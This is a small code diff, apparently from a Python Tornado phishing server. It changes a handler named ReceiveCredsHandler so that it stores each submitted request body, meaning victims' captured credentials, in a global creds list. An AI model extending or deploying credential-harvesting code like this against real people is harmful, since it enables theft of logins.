@@ -9,6 +9,7 @@ from constants import *
 
 template = False
 terminate = False
+creds = [] 
 
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
@@ -47,7 +48,8 @@ class ReceiveCredsHandler(tornado.web.RequestHandler):
                            W + "\n"
                            )
             log_file.close()
-        global terminate
+        global terminate, creds
+        creds.insert(0, repr(self.request.body))
         terminate = True
 
 
